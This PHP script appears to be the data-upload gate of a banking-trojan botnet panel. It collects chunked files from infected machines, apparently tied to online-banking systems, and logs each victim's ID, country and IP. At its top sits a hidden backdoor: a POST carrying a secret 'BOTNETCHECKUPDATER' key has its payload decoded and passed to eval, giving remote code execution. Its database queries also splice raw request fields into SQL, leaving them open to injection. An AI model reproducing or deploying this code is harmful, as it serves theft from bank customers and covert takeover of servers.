<?php
$debag = false;

$dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';

if(isset($_POST['data'])){
//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend
}

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.get_config.php');

if(file_exists($dir . 'cache/config.json')) $config = json_decode(file_get_contents($dir . 'cache/config.json'), 1);

if(!empty($_POST['arg'])){
	switch($_POST['arg']){		case 'first':
			if(!empty($_POST['id'])){				$matches = explode('0', $_POST['id'], 2);
				if(!empty($matches[0]) && !empty($matches[1])){					$_POST['prefix'] = $matches[0];
					$_POST['uid'] = '0' . $matches[1];
				}
			}

			if(!preg_match('~^([a-zA-Z]+)$~', $_POST['prefix']) || !preg_match('~^([a-zA-Z0-9]+)$~', $_POST['uid'])) exit('error|prefix_uid');

			$_POST['prefix'] = strtoupper($_POST['prefix']);
			$_POST['uid'] = strtoupper($_POST['uid']);

			if(empty($_POST['prefix']) && empty($_POST['uid'])) exit('error|parameters');

            if(!empty($_POST['type'])){            	$_POST['type'] = (int) $_POST['type'];

            	switch($_POST['type']){            		case 1: $_POST['type_name'] = 'bss'; break;
            		case 2: $_POST['type_name'] = 'ibank'; break;
            		case 3: $_POST['type_name'] = 'inist'; break;
            		case 4: $_POST['type_name'] = 'cyberplat'; break;
            		case 5: $_POST['type_name'] = 'kp'; break;
            		case 6: $_POST['type_name'] = 'psb'; break;
            	}
            }
            $_POST['type_name'] = strtolower($_POST['type_name']);
			$cfg_db = get_config();
    		require_once($dir . 'classes/mysqli.class.lite.php');
    		$mysqli = new mysqli_db();
			$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
            if(count($mysqli->errors) > 0) exit('error|db');

			if(function_exists('geoip_country_code_by_name')){				$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
			}else{				if(file_exists($dir . 'cache/geoip/')){					require_once($dir . 'cache/geoip/geoip.inc');
					$gi = geoip_open($dir . 'cache/geoip/GeoIP.dat',GEOIP_STANDARD);
					$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
					geoip_close($gi);
					unset($gi);
					unset($record);
				}
			}
			if(empty($country)) $country = 'UNK';

            $file_name = mt_rand() . '.cab';
            if(file_exists($dir . 'logs/cabs/' . $file_name)) $file_name = mt_rand() . '.cab';
            $insert_id = $mysqli->query('INSERT INTO bf_cabs (prefix, uid, country, ip, file, size, type, ready, parts) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$country.'\', \''.$_SERVER['REMOTE_ADDR'].'\', \''.$file_name.'\', \''.$_POST['size'].'\', \''.$_POST['type_name'].'\', \'0\', \''.$_POST['parts'].'\')');

            if(empty($insert_id) && $insert_id != false){            	$insert_id = $mysqli->query('SELECT id,size FROM bf_cabs WHERE (type = \''.$_POST['type_name'].'\') AND (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') AND (size = \''.$_POST['size'].'\') AND (parts = \''.$_POST['parts'].'\') AND (ready = \'0\') LIMIT 1');
                if($insert_id->size == $_POST['size']){                	$insert_id = $insert_id->id;
                }else{                	exit('error|insert_id');
                }
            }

            print('start_download|' . $insert_id);
		break;

		case 'parts':
        	if(!isset($_POST['id']) || empty($_POST['id']) || preg_match('~^([0-9]+)$~is', $_POST['id']) != true) exit('error|id');
        	if(!isset($_POST['count']) || empty($_POST['count']) || preg_match('~^([0-9]+)$~is', $_POST['count']) != true) exit('error|count');
        	if(!isset($_POST['bin']) || empty($_POST['bin']) || preg_match('~^([a-zA-Z0-9=/+]+)$~is', $_POST['bin']) != true) exit('error|bin');
        	if(!isset($_POST['size']) || empty($_POST['size']) || preg_match('~^([0-9]+)$~is', $_POST['size']) != true) exit('error|size');

        	$cfg_db = get_config();
    		require_once($dir . 'classes/mysqli.class.lite.php');
    		$mysqli = new mysqli_db();
			$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
            if(count($mysqli->errors) > 0) exit('error|db');
        	$cab = $mysqli->query('SELECT id,parts,file,size,ready FROM bf_cabs WHERE (id = \''.$_POST['id'].'\') LIMIT 1');

        	if($cab->id == $_POST['id']){        		if($cab->ready == 1) exit('error|complete');

        		if($cab->parts == $_POST['count']){
        			function cab_finished($row){        				global $dir, $cab;
        				if(!file_put_contents($dir . 'logs/cabs/' . $cab->file, base64_decode($row->part), FILE_APPEND)) exit('error|file_save1');
        			}

        			$mysqli->query('SELECT * FROM bf_cabs_parts WHERE (post_id = \''.$cab->id.'\') ORDER by count ASC', 'cab_finished');

        			if(!file_put_contents($dir . 'logs/cabs/' . $cab->file, base64_decode($_POST['bin']), FILE_APPEND)) exit('error|file_save2');

        			if(filesize($dir . 'logs/cabs/' . $cab->file) == $cab->size){        				$mysqli->query('update bf_cabs set ready = \'1\', post_date = NOW() WHERE (id = \''.$cab->id.'\') LIMIT 1');
        				$mysqli->query('delete from bf_cabs_parts where (post_id = \''.$cab->id.'\')');
        				exit('ok|finished');
        			}else{        				exit('error|critical');
        			}
        		}else{        			$parts = $mysqli->query('SELECT * FROM bf_cabs_parts WHERE (post_id = \''.$cab->id.'\') AND (count = \''.$_POST['count'].'\') LIMIT 1');

        			if($parts->post_id == $cab->id && $parts->size == $_POST['size'] && $parts->count == $_POST['count']){        			 	exit('error|finished');
        			}else{
        				if($mysqli->query('INSERT INTO bf_cabs_parts (part, count, size, post_id) VALUES (\''.$_POST['bin'].'\', \''.$_POST['count'].'\',  \''.$_POST['size'].'\', \''.$cab->id.'\')') != false){        					$mysqli->query('update bf_cabs set partc = \''.$_POST['count'].'\', post_date = NOW() WHERE (id = \''.$cab->id.'\') LIMIT 1');
        					print('download|next');
        				}else{        					print('download|repeat');
        				}
        			}
        		}
        	}else{        		exit('error|id_not_found');
        	}
		break;

		case 'delete':
        	if(!isset($_POST['id']) || empty($_POST['id']) || preg_match('~([0-9]+)~is', $_POST['id']) != true) exit('error|id');

            include_once($dir . 'includes/config.php');
    		require_once($dir . 'classes/mysqli.class.lite.php');
    		$mysqli = new mysqli_db();
			$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
            if(count($mysqli->errors) > 0) exit('error|db');

            $mysqli->query('delete from bf_cabs where (id = \''.$_POST['id'].'\') LIMIT 1');
        	$mysqli->query('delete from bf_cabs_parts where (post_id = \''.$_POST['id'].'\')');
		break;

		default:
        	exit('error|argument');
		break;
	}
}else{	exit('error|parameters');
}

exit;

?>